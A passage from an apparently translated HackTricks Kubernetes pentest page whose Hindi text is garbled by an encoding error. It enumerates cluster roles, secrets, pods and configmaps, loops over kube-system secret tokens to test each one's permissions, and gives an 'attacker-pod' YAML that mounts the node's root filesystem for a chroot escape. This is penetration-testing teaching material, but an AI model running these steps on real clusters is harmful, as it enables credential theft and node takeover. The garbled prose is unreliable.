{% tab title="API" %} 

### рдПрдкреАрдЖрдИ
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

рдЕрдкрдиреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИ: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

рдЖрдк **Kubernetes RBAC** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдкрдХреЛ рдкрддрд╛ рдЪрд▓ рдЬрд╛рдП** рдХрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреМрди-рдХреМрди рд╕реЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реИрдВ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ **рдХреНрдпрд╛ рдЖрдк рдЙрдиреНрд╣реЗрдВ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ** рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### рджреВрд╕рд░реЛрдВ рдХреЗ рднреВрдорд┐рдХрд╛рдПрдБ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %} 

### рдПрдкреАрдЖрдИ
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдиреЗрдорд╕реНрдкреЗрд╕

рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ **рдХрдИ рд╡рд░реНрдЪреБрдЕрд▓ рдХреНрд▓рд╕реНрдЯрд░** рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдПрдХ рд╣реА рднреМрддрд┐рдХ рдХреНрд▓рд╕реНрдЯрд░ рд╕реЗ рд╕рдорд░реНрдерд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЗрди рд╡рд░реНрдЪреБрдЕрд▓ рдХреНрд▓рд╕реНрдЯрд░ рдХреЛ **рдиреЗрдорд╕реНрдкреЗрд╕** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %} 

### рдПрдкреАрдЖрдИ
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
### рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рд░рд╣рд╕реНрдп

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

рдпрджрд┐ рдЖрдк рдЧреБрдкреНрдд рд╕реВрдЪрдирд╛рдПрдБ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдкреНрд░рддреНрдпреЗрдХ рдЯреЛрдХрди рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд▓рд╛рдЗрдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### рдкрд╛рдПрдВ рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ

рдЬреИрд╕рд╛ рдХрд┐ рдЗрд╕ рдкреГрд╖реНрда рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рдЪрд░реНрдЪрд╛ рдХреА рдЧрдИ рд╣реИ **рдЬрдм рдПрдХ рдкреЙрдб рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдЙрд╕реЗ рдЖрдо рддреМрд░ рдкрд░ рдПрдХ рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рд╕реМрдВрдкрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП, рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдХреА рд╕реВрдЪреА, рдЙрдирдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдФрд░ рд╡реЗ рдХрд╣рд╛рдБ рдЪрд▓ рд░рд╣реЗ рд╣реИрдВ рдЗрд╕реЗ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %} 

## рдПрдкреАрдЖрдИ

{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
### рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ

рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ рд╡рд╣ **рдШрдЯрдХ** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ **рдЪрд▓рд╛рдП рдЬрд╛рдиреЗ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
### рдкреЙрдбреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

рдкреЙрдбреНрд╕ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ **рдХрдВрдЯреЗрдирд░** рд╣реИрдВ рдЬреЛ **рдЪрд▓рд╛рдП** рдЬрд╛рдПрдВрдЧреЗред
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### рдПрдкреАрдЖрдИ
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### рдкреНрд░рд╛рдкреНрдд рд╕реЗрд╡рд╛рдПрдВ

Kubernetes **рд╕реЗрд╡рд╛рдПрдВ** рдХрд╛ рдЙрдкрдпреЛрдЧ **рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкреЛрд░реНрдЯ рдФрд░ рдЖрдИрдкреА рдореЗрдВ рд╕реЗрд╡рд╛ рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рди рдХрд░ рд░рд╣реЗ рдкреЙрдбреНрд╕ рдХреЗ рд▓рд┐рдП рд▓реЛрдб рдмреИрд▓реЗрдВрд╕рд░ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░реЗрдЧрд╛)ред рдпрд╣ рджреЗрдЦрдирд╛ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рдХрд┐ рдЖрдк рдХрд╣рд╛рдВ рдЕрдиреНрдп рд╕реЗрд╡рд╛рдПрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %} 

### рдПрдкреАрдЖрдИ
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
### рдиреЛрдбреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

**рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рдЕрдВрджрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╕рднреА рдиреЛрдбреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред**

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### рдбреЗрдордирд╕реЗрдЯреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

**рдбреЗрдордирд╕реЗрдЯреНрд╕** рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдХрд┐ рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рд╕рднреА рдиреЛрдбреНрд╕ рдореЗрдВ (рдпрд╛ рдЪрдпрдирд┐рдд рдиреЛрдбреНрд╕ рдореЗрдВ) рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдкреЙрдб рдЪрд▓ рд░рд╣рд╛ рд╣реИред рдпрджрд┐ рдЖрдк рдбреЗрдордирд╕реЗрдЯ рдХреЛ рд╣рдЯрд╛ рджреЗрддреЗ рд╣реИрдВ рддреЛ рдЗрд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдмрдВрдзрд┐рдд рдкреЙрдб рднреА рд╣рдЯрд╛ рджрд┐рдП рдЬрд╛рдПрдВрдЧреЗред

{% tabs %}
{% tab title="kubectl" %}
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
### рдХреНрд░реЙрдирдЬреЙрдм рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

рдХреНрд░реЙрди рдЬреЙрдм рдХреНрд░реЙрдирдЯреИрдм рдЬреИрд╕реА рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдкреЙрдб рдХрд╛ рдкреНрд░рдХреНрд╖реЗрдкрдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬреЛ рдХреБрдЫ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░реЗрдЧрд╛ред
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}  
### рдПрдкреАрдЖрдИ

- рдХреНрд▓рд╕реНрдЯрд░ рдПрдкреАрдЖрдИ рд╕рд░реНрд╡рд┐рд╕реЗрд╕ рдХреА рд╕реВрдЪреА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
  ```bash
  kubectl get svc --all-namespaces
  ```

- рдПрдкреАрдЖрдИ рд╕рд░реНрд╡рд┐рд╕ рдХреА рдкреВрд░реНрдг рд╡рд┐рд╡рд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
  ```bash
  kubectl describe svc <service-name> -n <namespace>
  ```

- рдПрдкреАрдЖрдИ рд╕рд░реНрд╡рд┐рд╕ рдХреЗ рд▓рд┐рдП рдПрдВрдбрдкреНрд╡рд╛рдЗрдВрдЯреНрд╕ рдХреА рд╕реВрдЪреА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
  ```bash
  kubectl get endpoints <service-name> -n <namespace>
  ```
{% endtab %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### рдХреЙрдиреНрдлрд╝рд┐рдЧрдореИрдк рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

рдХреЙрдиреНрдлрд╝рд┐рдЧрдореИрдк рд╣рдореЗрд╢рд╛ рдмрд╣реБрдд рд╕рд╛рд░реА рдЬрд╛рдирдХрд╛рд░реА рдФрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рд╛рдордЧреНрд░реА рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдХреБрдмрд░рдиреЗрдЯреНрд╕ рдореЗрдВ рдЪрд▓рдиреЗ рд╡рд╛рд▓реЗ рдРрдкреНрд╕ рдХреЛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рд╕рд╛рдорд╛рдиреНрдпрдд: рдЖрдкрдХреЛ рдмрд╣реБрдд рд╕рд╛рд░реЗ рдкрд╛рд╕рд╡рд░реНрдб, рд░рд╣рд╕реНрдп, рдЯреЛрдХрди рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЕрдиреНрдп рдЖрдВрддрд░рд┐рдХ/рдмрд╛рд╣реНрдп рд╕реЗрд╡рд╛ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдФрд░ рдорд╛рдиреНрдпрддрд╛ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред

{% tabs %}

{% tab title="kubectl" %}
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
### рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ "рд╕рднреА"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
### **рдкреЙрдб рдХреА рдЦрдкрдд рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
### рдкреЙрдб рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдирд╛

рдпрджрд┐ рдЖрдк рдирдП рдкреЙрдб рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рддреЛ рдЖрдк рдЙрдирд╕реЗ рдиреЛрдб рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдПрдХ yaml рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдирдпрд╛ рдкреЙрдб рдмрдирд╛рдирд╛ рд╣реЛрдЧрд╛, рдмрдирд╛рдП рдЧрдП рдкреЙрдб рдореЗрдВ рд╕реНрд╡рд┐рдЪ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдлрд┐рд░ рдиреЛрдб рдХреЗ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ chroot рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдЖрдк рдкрд╣рд▓реЗ рд╕реЗ рдореМрдЬреВрдж рдкреЙрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рдХрд┐ рд╡реЗ рдореМрдЬреВрджрд╛ рдЫрд╡рд┐рдпреЛрдВ рдФрд░ рдкрдереЛрдВ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рддреЗ рд╣реИрдВред
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рд╡рд┐рд╢рд┐рд╖реНрдЯ рдиреЛрдб рдкрд░ рдкреЙрдб рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рддреЛ рдиреЛрдб рдкрд░ рд▓реЗрдмрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ
>
> `k get nodes --show-labels`
>
> рд╕рд╛рдорд╛рдиреНрдпрдд: kubernetes.io/hostname рдФрд░ node-role.kubernetes.io/master рд╕рднреА рдЪреБрдирдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдЪреНрдЫреЗ рд▓реЗрдмрд▓ рд╣реИрдВред
>
> [рд╕рдВрджрд░реНрдн]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

рдлрд┐рд░ рдЖрдк рдЕрдкрдиреА attack.yaml рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рддреЗ рд╣реИрдВ
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[рдореВрд▓ yaml рд╕реНрд░реЛрдд](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

рдЙрд╕рдХреЗ рдмрд╛рдж рдЖрдк рдкреЙрдб рдмрдирд╛рддреЗ рд╣реИрдВред
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
рдЕрдм рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд░реВрдк рд╕реЗ рдмрдирд╛рдП рдЧрдП рдкреЙрдб рдкрд░ рд╕реНрд╡рд┐рдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
рдФрд░ рдЕрдВрдд рдореЗрдВ рдЖрдк рдиреЛрдб рдХреЗ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ chroot рдХрд░рддреЗ рд╣реИрдВред
```bash
chroot /root /bin/bash
```
рд╕реВрдЪрдирд╛ рдкреНрд░рд╛рдкреНрдд рдХреА рдЧрдИ рд╣реИ: [Kubernetes Namespace Breakout using Insecure Host Path Volume тАФ Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube тАУ Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## рд╕рдВрджрд░реНрдн

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдХреЛ** **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github рд░реЗрдкреЛ рдореЗрдВред**

</details>
{% endhint %}
